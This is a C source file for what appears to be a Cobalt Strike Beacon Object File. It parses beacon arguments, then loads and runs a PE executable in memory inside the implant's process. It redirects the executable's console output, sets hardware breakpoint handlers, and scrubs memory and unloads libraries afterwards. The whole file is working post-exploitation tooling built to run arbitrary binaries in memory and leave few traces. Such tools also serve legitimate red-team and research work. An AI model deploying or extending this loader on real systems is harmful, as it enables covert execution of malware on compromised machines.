
#include <windows.h>
#include "output.h"
#include "peb.c"
#include "loader.c"
#include "console.c"
#include "runner.c"
#include "hwbp.c"
#include "utils.c"

int go(IN PCHAR Buffer, IN ULONG Length)
{
    datap           parser        = { 0 };
    int             pe_length     = 0;
    PVOID           pe_bytes      = 0;
    LPSTR           pe_path       = 0;
    BOOL            local         = FALSE;
    UINT32          timeout       = 0;
    BOOL            headers       = FALSE;
    LPWSTR          cmdwline      = NULL;
    LPCSTR          cmdline       = NULL;
    LPSTR           method        = NULL;
    BOOL            use_unicode   = FALSE;
    BOOL            nooutput      = FALSE;
    BOOL            alloc_console = FALSE;
    BOOL            close_handles = FALSE;
    BOOL            unload_libs   = FALSE;
    PLIB_LOADED     libs_tmp      = NULL;
    PLIB_LOADED     libs_entry    = NULL;
    NTSTATUS        status        = STATUS_UNSUCCESSFUL;
    PLOADED_PE_INFO peinfo        = NULL;

    BeaconDataParse(&parser, Buffer, Length);
    pe_bytes      = BeaconDataExtract(&parser, &pe_length);
    pe_path       = BeaconDataExtract(&parser, NULL);
    local         = BeaconDataInt(&parser);
    timeout       = BeaconDataInt(&parser);
    headers       = BeaconDataInt(&parser);
    cmdwline      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    cmdline       = BeaconDataExtract(&parser, NULL);
    method        = BeaconDataExtract(&parser, NULL);
    use_unicode   = BeaconDataInt(&parser);
    nooutput      = BeaconDataInt(&parser);
    alloc_console = BeaconDataInt(&parser);
    close_handles = BeaconDataInt(&parser);
    unload_libs   = BeaconDataInt(&parser);

    peinfo = intAlloc(sizeof(LOADED_PE_INFO));

    peinfo->timeout       = timeout;
    peinfo->headers       = headers;
    peinfo->method        = method[0] ? method : NULL;
    peinfo->use_unicode   = use_unicode;
    peinfo->cmdwline      = cmdwline[0] ? cmdwline : NULL;
    peinfo->cmdline       = cmdline[0] ? cmdline : NULL;
    peinfo->nooutput      = nooutput;
    peinfo->alloc_console = alloc_console;
    peinfo->unload_libs   = unload_libs;

    if (local)
    {
        if (!read_local_pe(pe_path, &pe_bytes, &pe_length))
        {
            PRINT_ERR("failed to load local binary");
            goto Cleanup;
        }
    }

    if (!load_pe(pe_bytes, pe_length, peinfo))
    {
        PRINT_ERR("peload failure");
        goto Cleanup;
    }

    if (!create_thread(&peinfo->hThread))
    {
        PRINT_ERR("failed to create thread");
        goto Cleanup;
    }

    if (!redirect_std_out_err(peinfo))
    {
        PRINT_ERR("failed to redirect output");
        goto Cleanup;
    }

    if (!run_pe(peinfo))
    {
        PRINT_ERR("failed to run pe");
        goto Cleanup;
    }

Cleanup:
    if (pe_bytes)
        memset(pe_bytes, 0, pe_length);

    if (local && pe_bytes)
        intFree(pe_bytes);

    if (peinfo && peinfo->hHwBp1)
        remove_hwbp_handler(peinfo->hHwBp1);

    if (peinfo && peinfo->hHwBp2)
        remove_hwbp_handler(peinfo->hHwBp2);

    if (close_handles)
    {
        if (peinfo && peinfo->Handles && peinfo->Handles->fo_msvc)
        {
            void ( WINAPI *msvcrt_close ) ( int ) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "_close", 0);
            if (msvcrt_close)
                msvcrt_close(peinfo->Handles->fo_msvc);
        }

        if (peinfo && peinfo->Handles && peinfo->Handles->fo_ucrtbase)
        {
            void ( WINAPI *ucrtbase_close ) ( int ) = xGetProcAddress(xGetLibAddress("ucrtbase", TRUE, NULL), "_close", 0);
            if (ucrtbase_close)
                ucrtbase_close(peinfo->Handles->fo_ucrtbase);
        }

        if (peinfo && peinfo->Handles && peinfo->Handles->hRead)
            NtClose(peinfo->Handles->hRead);

        if (peinfo && peinfo->Handles && peinfo->Handles->hWrite)
            NtClose(peinfo->Handles->hWrite);

        if (peinfo && peinfo->Handles)
        {
            memset(peinfo->Handles, 0, sizeof(HANDLE_INFO));
            intFree(peinfo->Handles);
        }

        BeaconRemoveValue(HANDLE_INFO_KEY);
    }

    if (peinfo && peinfo->pe_base)
    {
        peinfo->pe_size = 0;
        status = NtFreeVirtualMemory(NtCurrentProcess(), &peinfo->pe_base, &peinfo->pe_size, MEM_RELEASE);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtFreeVirtualMemory", status);
            PRINT_ERR("Failed to cleanup PE from memory");
        }
    }

    if (peinfo && peinfo->modified_msvc_stdout)
        memcpy(peinfo->msvc_stdout, peinfo->original_msvc_stdout, sizeof(FILE));

    if (peinfo && peinfo->modified_msvc_stderr)
        memcpy(peinfo->msvc_stderr, peinfo->original_msvc_stderr, sizeof(FILE));

    if (peinfo && peinfo->modified_ucrtbase_stdout)
        memcpy(peinfo->ucrtbase_stdout, peinfo->original_ucrtbase_stdout, sizeof(UCRTBASE_FILE));

    if (peinfo && peinfo->modified_ucrtbase_stderr)
        memcpy(peinfo->ucrtbase_stderr, peinfo->original_ucrtbase_stderr, sizeof(UCRTBASE_FILE));

    if (peinfo && peinfo->original_msvc_stdout)
    {
        memset(peinfo->original_msvc_stdout, 0, sizeof(FILE));
        intFree(peinfo->original_msvc_stdout);
    }

    if (peinfo && peinfo->original_msvc_stderr)
    {
        memset(peinfo->original_msvc_stderr, 0, sizeof(FILE));
        intFree(peinfo->original_msvc_stderr);
    }

    if (peinfo && peinfo->original_ucrtbase_stdout)
    {
        memset(peinfo->original_ucrtbase_stdout, 0, sizeof(UCRTBASE_FILE));
        intFree(peinfo->original_ucrtbase_stdout);
    }

    if (peinfo && peinfo->original_ucrtbase_stderr)
    {
        memset(peinfo->original_ucrtbase_stderr, 0, sizeof(UCRTBASE_FILE));
        intFree(peinfo->original_ucrtbase_stderr);
    }

    if (peinfo && peinfo->modified_console_handle)
        set_console_handle(peinfo->original_console_handle);

    if (peinfo && peinfo->modified_console_reference)
        *(PHANDLE)peinfo->console_reference_addr = peinfo->original_console_reference;

    if (peinfo && peinfo->hThread)
    {
        TerminateThread(peinfo->hThread, 0);
        NtClose(peinfo->hThread);
    }

    if (peinfo && unload_libs)
    {
        libs_entry = peinfo->libs_loaded;
        while (libs_entry)
        {
            DPRINT("Freeing %s", libs_entry->name);
            FreeLibrary(libs_entry->address);

            libs_tmp = libs_entry->next;
            memset(libs_entry, 0, sizeof(LIB_LOADED));
            intFree(libs_entry);
            libs_entry = libs_tmp;
        }
    }

    if (peinfo)
    {
        memset(peinfo, 0, sizeof(LOADED_PE_INFO));
        intFree(peinfo);
    }

    return 0;
}
